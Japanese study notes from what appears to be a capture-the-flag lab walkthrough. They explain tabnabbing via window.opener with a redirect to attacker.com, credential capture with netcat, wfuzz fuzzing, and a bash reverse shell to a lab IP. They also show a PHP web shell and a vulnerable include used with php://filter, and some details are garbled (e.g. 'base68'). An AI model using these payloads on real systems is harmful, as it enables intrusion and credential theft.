新規タブでmalicious.htmlファイルが開く
かつ
malicious.htmlファイルからリンク元を操作できてしまう
リンク元＝さっき見てた別のページ
↓
malicious.html を見たら、さっき見てたページを勝手に手を入れられることがある

あなた＝自分の窓（ブラウザのタブ）で安全な絵本を読んでいる、安全な窓＝親ウィンドウ
malicious.html=悪い絵本さん
window.openerオブジェクト＝悪い絵本さんが持ってるあなたの窓の中を覗いたり、手を伸ばせる道具（魔法の鏡）
インスタンス＝その設計図から作られた実際に使える魔法の鏡
逆参照＝元の窓（＝親ウィンドウ）に手を伸ばして勝手に触ること
==malicious.htmlファイルにおいて、window.openerオブジェクトのインスタンスを経由して親ウィンドウへの逆参照ができる==
==このような逆参照を利用した攻撃をタブナビング攻撃という==

malicious.html
window.opener.location="http://attacker.com/fake.html";

window.opener :魔法の鏡で悪い絵本さん（malicious.html)が元の窓にこっそり手を伸ばして悪さできる道具

http以下　：　ねえ、親ウィンドウ、こっちに行ってー「http://attacker.....」親ウィンドウその命令を開いてしまい、気づかないうちに別の偽物ページに飛ばされる

罠にかかるuserが必要though


#タブナビング実際の実験

2つのファイルを用意
get_info.htmlファイル：既存のページとそっくりの罠ページ
ターゲット端末の”index.php"ファイル（ログインページ）と同じ
ファイル名だけを”get_info.html"に変更したもの

evil.html ファイル　タブナビング攻撃用のページ（親ウィンドウのlocation プロパティを罠ページに変更する）

①まずloginページのhtmlコピー
　ファイル名をget_info.htmlに（罠ページ、親ウィンドウが書き換えられるはずのページ）
②evil.htmlファイル　無料ブログプロモーションしたいブログとしてURLのところに送り込むサイトつまり子ウィンドウ？

window.opener.location=#http://192.168.56.101:31337/get_info.html";　ねえ親ウィンドウこっちに来て　 (さっきの罠ページ)


普通のページだけど中に子ウィンドウを作るページあってその子ウィンドウが親を乗っ取る

１２　タブナビング攻撃の罠ページを設置したhttpサービスを用意する
「誰かが子ページにリダイレクトして子ページがwindow.openerを使って親ページを別のページにリダイレクトしてしまう」

ファイルをネット（ローカル）で見られるようにする
get_info.html =罠ページ＝31337→netcatで待ち受け
evil.html=子ページ（送り込む）＝８０→python立てる


pythonはtcpの一段階上
netcatはtcpをそのまま触れるレンチ
　　３way hand

子ファイルを80port　pythonで立てる
罠ファイルは31337 netcatで待ち受けにする

netcatは声だけ届けるパイプ簡単で早い
pythonのhttpサーバーはちゃんと包んで渡す店員

ああ、このペアにする理由はpython側で正しいヘッダやファイルを出すと、ブラウザ挙動が安定する
一方でncは「どう反応するか」を試す観察窓になる
→yes罠ページに書き込まれたパスワードとかみたいからncなんだ

で、入力します
here押します

（元ウィンドウが書き換えられるのは自分のブラウザ上だけ→誰もログインしてない。？？？なぜ？？？
確認：wsなどみて、url登録時、やhere押した瞬間にサーバーから外向きにhttpリクエストが出ていないか確認）


投稿されたURLをサーバーが自動で取りに行き、そこで機密やヘッダを吐く場合ある

★新しいタブがそのページを動かしたり、押したりして、その見える場所からパスワードが外に送られるようにした

認証情報をsshアクセスに使う
使えた。は？？

#ssh認証できたあと
現状を把握する

groupsコマンド
etc/passwd 確認
alice:x:1000:1000:Alice:/home/alice:/bin/bash
user名：パスワードファイル：ユーザーID:GID：説明欄：ホームディレクトリ：ログインシェル

↓
システムに登録されたユーザーを特定する

root adrian daniel

config.phpファイルの内容を確かめる


#fuzzing 
９　httpリクエストに対してファジングする
fuzzぼやけたもの
fuzzing 通常では考えられない値を送る
　　　システムに意図的に変なデータや想定外のデータをぶつけてサーバーがどんな反応するかみる

Wfuzz = webにぐちゃぐちゃデータを投げつける道具
　　　　　↓
　　　　　まずファイルを探す
　　　　　↓
　　　　　拡張子を含くむファイルの辞書ファイルを用いる

httpリクエストにfuzzing⇒URL,入力欄（ユーザー名、パスワード）、ヘッダーに辞書の言葉を順番に入れて送ること

target:http://192.168.56.111/FUZZ/
FUZZ を書く位置でだいぶ攻撃の種類が変わる、URL狙い、フォーム狙い、ヘッダー狙い


#リバースシェルの配置場所
/dev/shm or  /tmp or /var/tmp

#/dev/shm shared memory linuxで使える共有メモリのための特別なディレクトリ　メモリ＝とても速いノート電源切ると消える
/dev/shm そのメモリが置いてある場所
すごく速いけど消える黒板、プログラム同士がメモを書いて見せ合うのに使う


#/tmp 電源切ったら消えるゴミ箱

#/var/tmp variable temporary よく変わるデータを置く場所、ずっとじゃなく必要な時だけ、一時的だけど、電源切っても残る引き出し

#リバースシェルの準備

daniel@napping:/dev/shm$ cat revshell.sh

＃/bin/bash
bash -c 'bash 
-i>&/dev/tcp/192.168.56.101/4242 0>&1'.

bash -c basに中の命令を実行させる
bash -i 対話できるシェルを起動する

自分のIPとポートに線をつなぎ、実行されると攻撃側に電話がかかってくる


#webシェル
ホームページはただの絵に見えるが、実はそのホームページが動いてるコンピュータが裏にある。webシェルはそのホームページに「こっそり魔法の扉」を使ってその裏のコンピュータに入る感じ
＝ウェブの忍者
つまり、「見える場所から裏のコンピュータをこっそり操作する道具」

ホームページの裏に置くと、そのページを開けた人が「こっそりコンピュータに命令」を送れるようになる
＝ホームページの裏に作った秘密のリモコン


#httpgetmethod ブラウザがサーバーにお願いすること
「このページちょうだい」
＜?php
     system ($_GET['cmd']);
　?>

system =システム、OSに命令を渡す関数
OS横の文字列をコマンドとして実行しろという意味

GET＝取りに行く
CMD＝command

「？cmd=ls」のように命令を出す

#php：//filterテクニック　よくわからない
透ける眼鏡を使って、箱の中身をちらっと見る感じ
普通は箱を開けられない

convert.base68-encode
1サーバーの中に秘密の絵（ソースコード）が入った箱がある。
２普通はその箱は鍵がかかってて見れない
３でもあるページ（テンプレート）に「OOして」と書ける小さな窓があって、そこに悪い人が「箱の中身見せて、でもそのままじゃバレるから、暗号にして出して」と命令できるとする
４サーバーは命令通り、箱の中身を優しいコード（base６８)に変えて、窓から出す
５悪い人はその暗号を受け取って元に戻せば、秘密の絵が手に入る。つまりソースコードを盗める

＜？ｐｈｐ
＄file=$_GET['file'];
include($file.'.php');
?>

サーバーくんにどの箱開けてもらう？って聞く、ユーザーの答えをサーバーは素直に答える

＄file~file］；　urlから送られてきたfileの値を取る
＄＿GET～PHP　別の絵本を今読んでる本にそっと混ぜて、読むイメージ。サーバーが箱を開けて中身を取り出す
.php ＝絵本の名前に.phpを付ける

このコードがサーバーにおいてなければ、phpfilterで攻撃することもできない
phpコードは「作った人が置いたサーバー」にだけある。ブラウザからのURLが届くとサーバー側で動く

#php はウェブページ専用に作られた言語
php使うとお客さんの注文に応じて毎回違う料理（ページ）を出せる。
phpファイル「厨房のレシピ」サーバーだけが読むと動く
サーバー「コックさん」
ブラウザ「お客さん」

hypertext processor htmlの中で魔法みたい二処理できるやつ
userが命令する、サーバーが素直に従う
悪い人はその流れに乗って、秘密の箱を奪う
